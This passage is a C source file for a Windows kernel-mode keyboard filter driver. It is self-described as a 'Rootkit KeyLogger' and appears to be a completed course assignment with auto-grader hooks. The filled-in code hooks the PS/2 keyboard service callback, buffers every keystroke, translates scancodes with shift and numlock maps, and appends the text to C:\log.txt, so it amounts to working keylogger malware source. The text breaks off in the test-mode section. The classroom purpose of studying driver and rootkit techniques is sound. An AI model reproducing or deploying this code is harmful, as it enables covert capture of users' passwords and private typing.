//-------------------------------------------------------------------------------------------------
// keylogger.c
//
// PS/2 keyboard driver for logging keyboard input
//-------------------------------------------------------------------------------------------------
#include "keylogger.h"
#include <stdbool.h>

#ifdef ALLOC_PRAGMA
// configure page handling (pageable, non-paged, initialization only)
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (PAGE, KeyLogger_EvtDeviceAdd)
#pragma alloc_text (PAGE, KeyLogger_EvtIoInternalDeviceControl)
#endif

//-------------------------------------------------------------------------------------------------
// Global variables
//
// The following global variables will be used by your driver to store keyboard data to be written and
//  provide global access to the log file handle.
//-------------------------------------------------------------------------------------------------
unsigned totalKeysLogged;   // Total number of records written to the file.

HANDLE logFile;     // Handle for the log file. Remains open throughout the driver's lifetime.

NTSTATUS logStatus; // save log file open results so debug prints can display it once the system has come up and DbgView opened

KEYBOARD_DATA_ARRAY keyboardDataArray;  // array of keystroke data used by callback to capture keystrokes

#define LOG_TRIGGER_POINT 2 // Value at which the writing work item fires (every 2 keystrokes here)

//-------------------------------------------------------------------------------------------------
// This section is for the auto-grader
//-------------------------------------------------------------------------------------------------
#if TESTMODE
/**
 * @brief Print debug message to key log file
 */
void DebugLog(const char* fmt, ...);

/**
 * @brief Load and run test input for auto-grader
 */
void ProcessTestInput();
#endif

//-------------------------------------------------------------------------------------------------
// Key Maps for translating key scan codes to strings to be logged
//-------------------------------------------------------------------------------------------------
#define KEYMAP_SIZE 89          // only support key codes 0 - 83
#define MAX_KEYSTR_LEN 20       // longest key string from key maps - for buffer sizing

// base key map - no shift, numlock off
const char *KeyMap[KEYMAP_SIZE] = {
    //
    // This is the default keymap. It should contain the default display strings for the first KEYMAP_SIZE key make
    //  codes, when unshifted and numlock is not on. If a code is invalid, this table should contain the make code
    //  as hex (e.g. "<0x00>"). The first 3 key codes have been done for you as an example
    //
    // CAUTION: If you use any strings in the key maps greater than 20 characters, MAX_KEYSTR_LEN must be updated
    //
    // START: /////////////////////////////////////////////// Part 1 ///////////////////////////////////////////////
    "<0x00>",       // 00, (Invalid)
    "<ESC>",        // 01, Escape
    "1",            // 02, 1!
    "2",            // 03, 2@
    "3",            // 04, 3#
    "4",            // 05, 4$
    "5",            // 06, 5%
    "6",            // 07, 6^
    "7",            // 08, 7&
    "8",            // 09, 8*
    "9",            // 0A, 9(
    "0",            // 0B, 0)
    "-",            // 0C, -_
    "=",            // 0D, =+
    "<BS>",         // 0E, Backspace
    "<TAB>",        // 0F, Tab
    "q",            // 10, qQ
    "w",            // 11, wW
    "e",            // 12, eE
    "r",            // 13, rR
    "t",            // 14, tT
    "y",            // 15, yY
    "u",            // 16, uU
    "i",            // 17, iI
    "o",            // 18, oO
    "p",            // 19, pP
    "[",            // 1A, [{
    "]",            // 1B, ]}
    "\n",           // 1C, Enter
    "<CONTROL>",    // 1D, Control
    "a",            // 1E, aA
    "s",            // 1F, sS
    "d",            // 20, dD
    "f",            // 21, fF
    "g",            // 22, gG
    "h",            // 23, hH
    "j",            // 24, jJ
    "k",            // 25, kK
    "l",            // 26, lL
    ";",            // 27, ;:
    "\'",           // 28, '"
    "`",            // 29, `~
    "<LSHIFT>",     // 2A, Left Shift
    "\\",           // 2B, \|
    "z",            // 2C, zZ
    "x",            // 2D, xX
    "c",            // 2E, cC
    "v",            // 2F, vV
    "b",            // 30, bB
    "n",            // 31, nN
    "m",            // 32, mM
    ",",            // 33, ,<
    ".",            // 34, .>
    "/",            // 35, /?
    "<RSHIFT>",     // 36, Right Shift
    "*",            // 37, * (Numpad)
    "<ALT>",        // 38, Left Alt
    " ",            // 39, Space
    "<CAPS>",       // 3A, Caps Lock
    "<F1>",         // 3B, F1
    "<F2>",         // 3C, F2
    "<F3>",         // 3D, F3
    "<F4>",         // 3E, F4
    "<F5>",         // 3F, F5
    "<F6>",         // 40, F6
    "<F7>",         // 41, F7
    "<F8>",         // 42, F8
    "<F9>",         // 43, F9
    "<F10>",        // 44, F10
    "<NUMLOCK>",    // 45, Num Lock
    "<SCROLL>",     // 46, Scroll Lock
    "<HOME>",       // 47, Home
    "<UP>",         // 48, Up
    "<PGUP>",       // 49, Page Up
    "-",            // 4A, - (Numpad)
    "<LEFT>",       // 4B, Left
    NULL,           // 4C, Clear
    "<RIGHT>",      // 4D, Right
    "+",            // 4E, + (Numpad)
    "<END>",        // 4F, End
    "<DOWN>",       // 50, Down
    "<PGDOWN>",     // 51, Page Down
    "<INS>",        // 52, Insert
    "<DEL>",        // 53, Delete
    NULL,           // 54, ???
    NULL,           // 55, ???
    NULL,           // 56, ???
    "<F11>",        // 57, F11
    "<F12>"         // 58, F12

    // END:   /////////////////////////////////////////////// Part 1 ///////////////////////////////////////////////
};

// shifted key map - shift down
const char *SHKeyMap[KEYMAP_SIZE] = {
    //
    // Any keys that are different when they are shifted, place the shifted value here, otherwise put NULL. The first
    //  NULL entry is added to make the starter code compilable.
    //
    // START: /////////////////////////////////////////////// Part 2 ///////////////////////////////////////////////
    "<0x00>",       // 00, (Invalid)
    NULL,           // 01, Escape
    "!",            // 02, 1!
    "@",            // 03, 2@
    "#",            // 04, 3#
    "$",            // 05, 4$
    "%",            // 06, 5%
    "^",            // 07, 6^
    "&",            // 08, 7&
    "*",            // 09, 8*
    "(",            // 0A, 9(
    ")",            // 0B, 0)
    "_",            // 0C, -_
    "+",            // 0D, =+
    NULL,           // 0E, Backspace
    NULL,           // 0F, Tab
    "Q",            // 10, qQ
    "W",            // 11, wW
    "E",            // 12, eE
    "R",            // 13, rR
    "T",            // 14, tT
    "Y",            // 15, yY
    "U",            // 16, uU
    "I",            // 17, iI
    "O",            // 18, oO
    "P",            // 19, pP
    "{",            // 1A, [{
    "}",            // 1B, ]}
    NULL,           // 1C, Enter
    NULL,           // 1D, Control
    "A",            // 1E, aA
    "S",            // 1F, sS
    "D",            // 20, dD
    "F",            // 21, fF
    "G",            // 22, gG
    "H",            // 23, hH
    "J",            // 24, jJ
    "K",            // 25, kK
    "L",            // 26, lL
    ":",            // 27, ;:
    "\"",           // 28, '"
    "~",            // 29, `~
    NULL,           // 2A, Left Shift
    "|",             // 2B, \|
    "Z",            // 2C, zZ
    "X",            // 2D, xX
    "C",            // 2E, cC
    "V",            // 2F, vV
    "B",            // 30, bB
    "N",            // 31, nN
    "M",            // 32, mM
    "<",            // 33, ,<
    ">",            // 34, .>
    "?",            // 35, /?
    NULL,           // 36, Right Shift
    NULL,           // 37, * (Numpad)
    NULL,           // 38, Left Alt
    NULL,           // 39, Space
    NULL,           // 3A, Caps Lock
    NULL,           // 3B, F1
    NULL,           // 3C, F2
    NULL,           // 3D, F3
    NULL,           // 3E, F4
    NULL,           // 3F, F5
    NULL,           // 40, F6
    NULL,           // 41, F7
    NULL,           // 42, F8
    NULL,           // 43, F9
    NULL,           // 44, F10
    NULL,           // 45, Num Lock
    NULL,           // 46, Scroll Lock
    NULL,           // 47, Home
    NULL,           // 48, Up
    NULL,           // 49, Page Up
    NULL,           // 4A, - (Numpad)
    NULL,           // 4B, Left
    NULL,           // 4C, Clear
    NULL,           // 4D, Right
    NULL,           // 4E, + (Numpad)
    NULL,           // 4F, End
    NULL,           // 50, Down
    NULL,           // 51, Page Down
    NULL,           // 52, Insert
    NULL,           // 53, Delete
    NULL,           // 54, ???
    NULL,           // 55, ???
    NULL,           // 56, ???
    NULL,           // 57, F11
    NULL            // 58, F12

    // END:   /////////////////////////////////////////////// Part 2 ///////////////////////////////////////////////
};

// numlock keymap
const char* NLKeyMap[KEYMAP_SIZE] = {
    //
    // Keypad numbers that change when numlock is on should have their numeric versions here, otherwise put NULL. The
    //  first NULL entry is added to make the starter code compilable.
    //
    // START: /////////////////////////////////////////////// Part 3 ///////////////////////////////////////////////
    NULL,
    [0x47] = "7",  // 47, Home
    "8",           // 48, Up
    "9",           // 49, Page Up
    NULL,          // 4A, - (Numpad)
    "4",           // 4B, Left
    "5",           // 4C, Clear
    "6",           // 4D, Right
    NULL,          // 4E, + (Numpad)
    "1",           // 4F, End
    "2",           // 50, Down
    "3",           // 51, Page Do
    "0",           // 52, Insert
    ".",           // 53, Delete
    NULL,           // 54, ???
    NULL,           // 55, ???
    NULL,           // 56, ???
    NULL,           // 57, F11
    NULL            // 58, F12

    // END:   /////////////////////////////////////////////// Part 3 ///////////////////////////////////////////////
};

//
// Add additional keymaps if necessary (e.g. for extra credit tasks)
//
// START: /////////////////////////////////////////////// Part 4 ///////////////////////////////////////////////


// END:   /////////////////////////////////////////////// Part 4 ///////////////////////////////////////////////


//
// Add definitions and macros if needed. The shift key codes have been provided as an example, as well as a
//      macro for testing for a Make event
//
// START: /////////////////////////////////////////////// Part 5 ///////////////////////////////////////////////
//
// Definitions and Macros for processing keys
//
#define KEY_LSHIFT 0x2A
#define KEY_RSHIFT 0x36
#define KEY_NUMLOCK 0X45

#define MAKE_MASK 0x0001
#define IS_MAKE(flags)       (((flags)&MAKE_MASK) == KEY_MAKE)  // Make/Break is indicated by the last bit

// END:   /////////////////////////////////////////////// Part 5 ///////////////////////////////////////////////

//
// Add variables for tracking key state as needed. NumLock status has been added as an example
//
//  Note: I normally discourage use of the legacy Windows type definitions, in favor of standard language types,
//      such as bool/true/false in this case. But kernel code cannot include stdbool.h, so the legacy types are
//      all we have
//
// START: /////////////////////////////////////////////// Part 6 ///////////////////////////////////////////////

BOOLEAN numLockOn = TRUE;                   // Assume numlock initially on
bool lShiftPressed = false;
bool rShiftPressed = false;

// END:   /////////////////////////////////////////////// Part 6 ///////////////////////////////////////////////

/**
 * @brief Lookup a display string for a key by scancode, returns "" if invalid
 *
 * @param makecode Key scancode to look up
 */
const char *LookupKey(unsigned makecode, unsigned flags)
{
    //
    // Add code to determine the appropriate display string from the key maps for the given key code
    //
    // START: /////////////////////////////////////////////// Part 7 ///////////////////////////////////////////////

    if (!IS_MAKE(flags))
    {
        DebugPrint(("Key lookup invoked for: 0x % 02X on key release (break)\n", makecode));
        return NULL;
    }

    // return nothing if make code is out of bounds of keymap
    if (makecode >= KEYMAP_SIZE)
    {
        DebugPrint(("Make code is not in keymap: 0x%02X\n", makecode));
        return "";
    }

    // check numlock cases
    if (numLockOn && NLKeyMap[makecode])
    {
        return NLKeyMap[makecode];
    }
    // check shift cases
    else if ((rShiftPressed || lShiftPressed) && SHKeyMap[makecode])
    {
        return SHKeyMap[makecode];
    }
    // check default cases
    else if (KeyMap[makecode])
    {
        return KeyMap[makecode];
    }
    // if entry still null, return an empty string
    return "";

    // END:   /////////////////////////////////////////////// Part 7 ///////////////////////////////////////////////
}


/**
 *
 * Open the log file for writing. If the file does not yet exist, create it.
 *
 * Return:
 *
 *      Status of the operation.
 **/
NTSTATUS OpenLogFile()
{
    //
    // Use InitializeObjectAttributes() to provide a name for the log file
    //
    // START: /////////////////////////////////////////////// Part 8 ///////////////////////////////////////////////
    UNICODE_STRING fileName;
    RtlInitUnicodeString(&fileName, L"\\DosDevices\\c:\\log.txt");
    OBJECT_ATTRIBUTES fileObjectAttributes = { 0 };

    InitializeObjectAttributes(&fileObjectAttributes, &fileName, OBJ_KERNEL_HANDLE, NULL, NULL);

    // END:   /////////////////////////////////////////////// Part 8 ///////////////////////////////////////////////


    //
    // Open/Create the log file using ZwCreateFile() (use FILE_SHARE_READ so we can view our log without uninstalling the driver)
    //
    // START: /////////////////////////////////////////////// Part 9 ///////////////////////////////////////////////

    IO_STATUS_BLOCK ioStatusBlock;          // this is a dummy for the required ZwCreateFile() parameter
    NTSTATUS status = STATUS_SUCCESS;

    status = ZwCreateFile(&logFile, GENERIC_WRITE | SYNCHRONIZE, &fileObjectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0 );

    if (!NT_SUCCESS(status))
    {
        DebugPrint(("ZwCreateFile() failed (0x%08X)\n", status));
        logFile = NULL;
        logStatus = status;             // this occurs during system startup and is difficult to debug, so save status for later
        return status;
    }

    // END:   /////////////////////////////////////////////// Part 9 ///////////////////////////////////////////////

    DebugPrint(("File successfully opened\n"));
    return status;
}

/**
 *
 * Write buffer to the log file.
 *
 * Arguments:
 *
 *      PKEYBOARD_INPUT_DATA keyData
 *          Pointer to an array of keystroke data to be written. Note that this is NOT the global
 *          keyboard data buffer, but a safe copy that the work item holds.
 *
 *      unsigned count
 *          Number of entries of type KEYBOARD_INPUT_DATA in the keyData array
 *
 * Return:
 *      Status of the operation.
 **/
NTSTATUS WriteToLogFile(PKEYBOARD_INPUT_DATA keyData, unsigned keyCount)
{
    // track keystrokes logged this time; add to totalKeysLogged after successfully writing them
    unsigned keysWritten = 0;
    // local buffer for building string to write to log
    //      SZ_KEYBOARD_DATA_ARRAY is the max key strokes that will be collected before flushing to log
    //      MAX_KEYSTR_LEN is the maximum string length of any display string from the key maps
    char buffer[SZ_KEYBOARD_DATA_ARRAY * MAX_KEYSTR_LEN + 1] = { 0 };

    // if the log file isn't open, debug print the failure code and fail the write attempt
    if (logFile == NULL)
    {
        DebugPrint(("ZwCreateFile() failed during OpenLogFile() (0x%08X)\n", logStatus));
        return STATUS_FILE_INVALID;
    }

    //
    // Process the keyboard input data in the keyData array that contains keyCount key input messages
    //  - Iterate through keyboard input messages
    //  - Interpret the data to determine what should be logged (e.g. Shift changes a flag, but 'A' gets logged)
    //  - For keys that should be logged, use LookupKey() to determine the display string to be logged
    //  - strcat the display string onto buffer
    //  - Increment keysWritten for each item added to the buffer
    //
    // START: /////////////////////////////////////////////// Part 10 ///////////////////////////////////////////////

    for (unsigned idx = 0; idx < keyCount; idx++)
    {
        // Shift on w/ make, off w/ break. Then continue
        if (keyData[idx].MakeCode == KEY_LSHIFT)
        {
            lShiftPressed = IS_MAKE(keyData[idx].Flags);
            continue;
        }
        if (keyData[idx].MakeCode == KEY_RSHIFT)
        {
            rShiftPressed = IS_MAKE(keyData[idx].Flags);
            continue;
        }
        // continue in case of break code
        if (!IS_MAKE(keyData[idx].Flags))
        {
            continue;
        }
        // Numlock on w/ make then off w/ make
        if (keyData[idx].MakeCode == KEY_NUMLOCK && IS_MAKE(keyData[idx].Flags))
        {
            numLockOn = !numLockOn;
        }
        // look up string associated with scancode and append to the buffer
        const char * keyString = LookupKey(keyData[idx].MakeCode, keyData[idx].Flags);
        keysWritten++;
        if (keyString[0] == '\0')       // if returned string was empty string, print the hex
        {
            char hexStr[8];
            sprintf(hexStr, "<0x%02X>", keyData[idx].MakeCode);
            strcat(buffer, hexStr);
            continue;
        }
        strcat(buffer, keyString);
    }

    totalKeysLogged += keysWritten;

    // END:   /////////////////////////////////////////////// Part 10 ///////////////////////////////////////////////

    //
    // Use ZwWriteFile() to write buffer to the global logFile. If write fails, debug print the failure status,
    //  otherwise add keysWritten to the global totalKeysLogged
    //
    // START: /////////////////////////////////////////////// Part 11 ///////////////////////////////////////////////

    IO_STATUS_BLOCK     ioStatusBlock = { 0 };
    NTSTATUS status = STATUS_SUCCESS;
    LARGE_INTEGER byteOffset = { .HighPart = -1, .LowPart = FILE_WRITE_TO_END_OF_FILE };
    status = ZwWriteFile(logFile, NULL, NULL, NULL, &ioStatusBlock, buffer, (ULONG) strlen(buffer), &byteOffset , NULL);
    if (!NT_SUCCESS(status))
    {
        DebugPrint(("ZwWriteFile() failed (0x%08X)\n", status));
        return status;
    }

    // END:   /////////////////////////////////////////////// Part 11 ///////////////////////////////////////////////

    DebugPrint(("Total keys written so far: %lu\n", totalKeysLogged));
    return status;
}



/**
 *
 * Initialize Keyboard Data Array used to capture keystrokes as they happen. Create spin lock protecting it.
 *
 * Return:
 *
 *      Status of the operation.
 *
 **/
NTSTATUS InitKeyboardDataArray()
{
    // Set the initial index to 0
    keyboardDataArray.index = 0;

    // Create spin lock that protects the buffer.
    WDF_OBJECT_ATTRIBUTES spinLockAttributes;
    WDF_OBJECT_ATTRIBUTES_INIT(&spinLockAttributes);

    NTSTATUS status = WdfSpinLockCreate(&spinLockAttributes, &keyboardDataArray.spinLock);

    if (!NT_SUCCESS(status))
    {
        DebugPrint(("WdfSpinLockCreate failed with code: %x\n", status));
        return status;
    }

    return status;
}


/**
 *
 * Add an element to the array by first obtaining the spin lock, then performing addition, and
 * finally releasing the spin lock.
 *
 * Arguments:
 *
 *      PKEYBOARD_INPUT_DATA entry
 *          Entry to add.
 *
 **/
VOID AddToBuffer(PKEYBOARD_INPUT_DATA entry)
{
    WdfSpinLockAcquire(keyboardDataArray.spinLock);

    keyboardDataArray.buffer[keyboardDataArray.index] = *entry;
    keyboardDataArray.index++;

    WdfSpinLockRelease(keyboardDataArray.spinLock);

}


/**
 *
 * Grab all pending keystrokes from the keyboard data buffer by first obtaining the spin lock, then performing
 * extraction, and finally releasing the spin lock.
 *
 * Arguments:
 *
 *      PKEYBOARD_INPUT_DATA dest
 *          Where to place the contents of the buffer.
 *
 * Return:
 *
 *      The number of the entries obtained.
 *
 **/
unsigned GrabKeystrokes(PKEYBOARD_INPUT_DATA dest)
{
    // if no buffer given, return 0
    if (dest == NULL)
    {
        return 0;
    }

    // lock around access to global keyboardDataArray
    WdfSpinLockAcquire(keyboardDataArray.spinLock);

    unsigned count = keyboardDataArray.index;
    for (unsigned idx = 0; idx < count; idx++)
    {
        dest[idx] = keyboardDataArray.buffer[idx];
    }
    // zero out capture array index so it will start from beginning
    keyboardDataArray.index = 0;
    // release lock so capture can resume
    WdfSpinLockRelease(keyboardDataArray.spinLock);

    return count;
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////
//////
//////                The Below Functions are to setup and install the driver and its various callbacks
//////                  Students who need a more difficult challenge can look below and edit various
//////                  functions and see what they do.
//////                  An advanced challenge would be to have the kernel driver read data from a file
//////                  and make changes to the program based on the file, similar to a configuration
//////                  file. Please pay note to how we are implementing the keyboard driver, at what
//////                  level the driver is inserted, and what we can do with it.
//////
//////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/**
 *
 * Installable driver initialization entry point.
 * This entry point is called directly by the I/O system.
 *
 * Arguments:
 *
 *      PDRIVER_OBJECT DriverObject
 *          Pointer to the driver object
 *
 *      PUNICODE_STRING RegistryPath
 *          Pointer to a unicode string representing the path,
 *           to driver-specific key in the registry.
 *
 * Return Value:
 *
 *      Status of the operation.
 *
 **/
NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject, IN PUNICODE_STRING RegistryPath)
{
    WDF_DRIVER_CONFIG               config;
    NTSTATUS                        status;

    DebugPrint(("Rootkit KeyLogger KMDF Driver Example.\n"));
    DebugPrint(("Build time: %s %s\n", __DATE__, __TIME__));


    // Initiialize driver config.
    WDF_DRIVER_CONFIG_INIT(&config, KeyLogger_EvtDeviceAdd);


    // Create a framework driver object.
    status = WdfDriverCreate(DriverObject, RegistryPath, WDF_NO_OBJECT_ATTRIBUTES, &config, WDF_NO_HANDLE);

    if (!NT_SUCCESS(status))
    {
        DebugPrint(("WdfDriverCreate failed with status 0x%x\n", status));
    }

    return status;
}


/**
 *
 * DeviceAdd routine.
 * Called in response to AddDevice call from PnP manager.
 *
 **/
NTSTATUS KeyLogger_EvtDeviceAdd(IN WDFDRIVER Driver, IN PWDFDEVICE_INIT  DeviceInit)
{
    WDF_OBJECT_ATTRIBUTES   deviceAttributes;
    NTSTATUS                status;
    WDFDEVICE               hDevice;
    PDEVICE_EXTENSION       filterExt;
    WDF_IO_QUEUE_CONFIG     ioQueueConfig;

    UNREFERENCED_PARAMETER(Driver);

    PAGED_CODE();

    // Tell the framework that you are filter driver. The framework takes care of inherting all the device flags & characterstics from the lower device you are attaching to.
    WdfFdoInitSetFilter(DeviceInit);

    WdfDeviceInitSetDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);

    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&deviceAttributes, DEVICE_EXTENSION);

    // Create a framework device object.
    status = WdfDeviceCreate(&DeviceInit, &deviceAttributes, &hDevice);

    if (!NT_SUCCESS(status))
    {
        DebugPrint(("WdfDeviceCreate failed with status code 0x%x\n", status));
        return status;
    }

    // Get device extension data.
    filterExt = GetDeviceExtension(hDevice);

    //
    // Configure the default queue to be Parallel. Do not use sequential queue
    // if this driver is going to be filtering PS2 ports because it can lead to
    // deadlock. The PS2 port driver sends a request to the top of the stack when it
    // receives an ioctl request and waits for it to be completed. If you use a
    // a sequential queue, this request will be stuck in the queue because of the
    // outstanding ioctl request sent earlier to the port driver.
    //
    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig, WdfIoQueueDispatchParallel);

    // Framework by default creates non-power managed queues for filter drivers.
    ioQueueConfig.EvtIoInternalDeviceControl = KeyLogger_EvtIoInternalDeviceControl;

    status = WdfIoQueueCreate(hDevice, &ioQueueConfig, WDF_NO_OBJECT_ATTRIBUTES, WDF_NO_HANDLE);

    if (!NT_SUCCESS(status))
    {
        DebugPrint( ("WdfIoQueueCreate failed 0x%x\n", status));
        return status;
    }

    // Create work item.
    CreateWorkItem(hDevice);

    //
    // Initialize global structures, create, open and set proper permissions
    // on the log file. This is done to deny any access to the file while
    // the driver is loaded. Howerver note that the administrator can always
    // change the ownership of a file, thus acquiring access to the file.
    // This should however never happen when the driver is loaded, as it
    // keeps handle to the log file open.
    //
    InitKeyboardDataArray();
    OpenLogFile();

    // Set total written records field to 0.
    totalKeysLogged = 0;

    return status;
}


/**
 *
 * Dispatch routine for internal device control requests.
 *
 **/
VOID KeyLogger_EvtIoInternalDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request, IN size_t OutputBufferLength, IN size_t InputBufferLength, IN ULONG IoControlCode)
{
    PDEVICE_EXTENSION               devExt;
    PINTERNAL_I8042_HOOK_KEYBOARD   hookKeyboard = NULL;
    PCONNECT_DATA                   connectData = NULL;
    NTSTATUS                        status = STATUS_SUCCESS;
    size_t                          length;
    WDFDEVICE                       hDevice;
    BOOLEAN                         ret = TRUE;
    WDF_REQUEST_SEND_OPTIONS        options;

    UNREFERENCED_PARAMETER(OutputBufferLength);
    UNREFERENCED_PARAMETER(InputBufferLength);
    UNREFERENCED_PARAMETER(hookKeyboard);

    PAGED_CODE();


    hDevice = WdfIoQueueGetDevice(Queue);
    devExt = GetDeviceExtension(hDevice);

    switch (IoControlCode)
    {
    // Connect a keyboard class device driver to the port driver.
    case IOCTL_INTERNAL_KEYBOARD_CONNECT:
        // Only allow one connection.
        if (devExt->UpperConnectData.ClassService != NULL) {
            status = STATUS_SHARING_VIOLATION;
            break;
        }

        // Get the input buffer from the request
        // (Parameters.DeviceIoControl.Type3InputBuffer).
        status = WdfRequestRetrieveInputBuffer(Request, sizeof(CONNECT_DATA), &connectData, &length);
        if(!NT_SUCCESS(status))
        {
            DebugPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
            break;
        }

        NT_ASSERT(length == InputBufferLength);

        devExt->UpperConnectData = *connectData;

        // Hook into the report chain.  Everytime a keyboard packet is reported
        // to the system, KbFilter_ServiceCallback will be called

        connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);

#pragma warning(disable:4152)  //nonstandard extension, function/data pointer conversion

        connectData->ClassService = KeyLogger_ServiceCallback;

#pragma warning(default:4152)

#if TESTMODE
        // for test mode, process test info after keyboard connect
        ProcessTestInput();
#endif
        break;

    // Disconnect a keyboard class device driver from the port driver.
    case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:

        status = STATUS_NOT_IMPLEMENTED;
        break;

    // Might want to capture these in the future.  For now, then pass them down the stack.
    // These queries must be successful for the RIT to communicate with the keyboard.
    case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
    case IOCTL_KEYBOARD_QUERY_INDICATORS:
    case IOCTL_KEYBOARD_SET_INDICATORS:
    case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
    case IOCTL_KEYBOARD_SET_TYPEMATIC:
        break;
    }

    if (!NT_SUCCESS(status))
    {
        WdfRequestComplete(Request, status);
        return;
    }

    // We are not interested in post processing the IRP so fire and forget.
    WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

    ret = WdfRequestSend(Request, WdfDeviceGetIoTarget(hDevice), &options);

    if (!ret)
    {
        status = WdfRequestGetStatus (Request);
        DebugPrint(("WdfRequestSend failed: 0x%x\n", status));
        WdfRequestComplete(Request, status);
    }
}



/**
 *
 * Callback that is called when the keyboard packets are to be reported to the Win32 subsystem.
 * In this function the packets are added to the global keyboard data buffer.
 *
 **/
VOID KeyLogger_ServiceCallback(IN PDEVICE_OBJECT DeviceObject, IN PKEYBOARD_INPUT_DATA InputDataStart, IN PKEYBOARD_INPUT_DATA InputDataEnd, IN OUT PULONG InputDataConsumed)
{
    PDEVICE_EXTENSION   devExt;
    WDFDEVICE           hDevice;

    hDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);

    // Get the Device Extension.
    devExt = GetDeviceExtension(hDevice);


#ifndef TESTMODE
    // don't capture actual keystrokes in test mode

    // Loop that adds all keyboard data to the global array.
    unsigned totalKeys = (unsigned)(InputDataEnd - InputDataStart);
    for (unsigned idx = 0; idx < totalKeys; idx++)
    {
        AddToBuffer(&InputDataStart[idx]);
    }

    // Check if the number of elements in the global buffer exceeds or is equal to the preset point.
    if (keyboardDataArray.index >= LOG_TRIGGER_POINT)
    {

        // Queue work item that will write the intercepted data to the log file.

        // Get worker item context
        PWORKER_ITEM_CONTEXT workerItemContext = GetWorkItemContext(devExt->workItem);

        if (workerItemContext->hasRun)
        {

            // The hasRun field will be set to false until the worker finishes its job.
            workerItemContext->hasRun = FALSE;
            KeyLoggerQueueWorkItem(devExt->workItem);
        }
    }
#endif

    (*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR) devExt->UpperConnectData.ClassService)(
        devExt->UpperConnectData.ClassDeviceObject,
        InputDataStart,
        InputDataEnd,
        InputDataConsumed);
}


/**
 *
 * Work item callback. Responsible for calling PASSIVE_LEVEL functions like writing to log file.
 *
 * Arguments:
 *
 *      WDFWORKITEM WorkItem
 *          WorkItem object created earlier
 *
 **/
VOID WriteWorkItem(WDFWORKITEM WorkItem)
{
    PWORKER_ITEM_CONTEXT context = GetWorkItemContext(WorkItem);

    // grab all captured keystrokes into a buffer for processing
    unsigned count = GrabKeystrokes(context->buffer);

    // Write dumped elements to the file.
    WriteToLogFile(context->buffer, count);

    // Indicate that worker has finished its job.
    context->hasRun = TRUE;
}


/**
 *
 * Initialize and create work item. The created object is stored in the device extension of the parameter DeviceObject.
 * https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdfworkitem/nf-wdfworkitem-wdfworkitemcreate
 *
 * Arguments:
 *
 *      WDFDEVICE DeviceObject
 *          Object containing work item in its device extension.
 *
 * Returns:
 *
 *      Status of the operation.
 *
 **/
NTSTATUS CreateWorkItem(WDFDEVICE DeviceObject)
{
    WDF_OBJECT_ATTRIBUTES workItemAttributes;
    WDF_OBJECT_ATTRIBUTES_INIT(&workItemAttributes);
    WDF_OBJECT_ATTRIBUTES_SET_CONTEXT_TYPE(&workItemAttributes, WORKER_ITEM_CONTEXT);

    workItemAttributes.ParentObject = DeviceObject;

    // Configure the work item
    WDF_WORKITEM_CONFIG workitemConfig;
    WDF_WORKITEM_CONFIG_INIT(&workitemConfig, WriteWorkItem);

    // Get the Device Extension
    PDEVICE_EXTENSION devExt = GetDeviceExtension(DeviceObject);

    NTSTATUS status = WdfWorkItemCreate(&workitemConfig, &workItemAttributes, &(devExt->workItem));

    if (!NT_SUCCESS(status))
    {
        DebugPrint(("Work item creation failed with error code: 0x%08X\n", status));
        return status;
    }
    PWORKER_ITEM_CONTEXT context = GetWorkItemContext(devExt->workItem);

    // Set the field hasRun to true so that the work item can
    // be queued first time.
    context->hasRun = TRUE;

    return status;
}


/**
 *
 * Enqueue work item.
 *
 * Arguments:
 *
 *      WDFWORKITEM workItem
 *          Work item to enqueue.
 *
 **/
VOID KeyLoggerQueueWorkItem(WDFWORKITEM workItem)
{
    WdfWorkItemEnqueue(workItem);
}


//
// This section is for the auto-grader
//
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////
//////
//////                This section is test mode code used by the grading script
//////
//////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#if TESTMODE

//
// Special characters used in parsing test keystroke data
//
#define EOL1 '\n'
#define EOL2 '\r'
#define START_COMMENT ';'

typedef struct _KEYBOARD_INPUT
{
    unsigned size;  // size of keystrokes array
    unsigned count; // number of actual keystrokes in array
    KEYBOARD_INPUT_DATA* keystrokes;
} KEYBOARD_INPUT, *PKEYBOARD_INPUT;

typedef const KEYBOARD_INPUT* PCKEYBOARD_INPUT;


/**
 * @brief Print debug message to key log file
 */
void DebugLog(const char* fmt, ...)
{
    char buffer[2048];
    va_list ap;
    va_start(ap, fmt);
    RtlStringCchVPrintfA(buffer, sizeof(buffer), fmt, ap);
    va_end(ap);

    IO_STATUS_BLOCK     ioStatusBlock = { 0 };
    LARGE_INTEGER       ByteOffset = { .HighPart = -1, .LowPart = FILE_WRITE_TO_END_OF_FILE };

    // Note: Typecast is required on strlen() b/c it returns size_t and ZwWriteFile() takes ULONG param
    NTSTATUS status = ZwWriteFile(logFile, NULL, NULL, NULL, &ioStatusBlock, buffer, (unsigned)strlen(buffer), &ByteOffset, NULL);
    if (!NT_SUCCESS(status))
    {
        DebugPrint(("DebugLog to log failed with code: 0x%08X\n", status));
    }
}


/**
 * @brief Query size of an open file
 */
UINT64 GetFileSize(HANDLE fileHandle)
{

    FILE_STANDARD_INFORMATION fileInfo = { 0 };
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status = ZwQueryInformationFile(
        fileHandle,
        &ioStatusBlock,
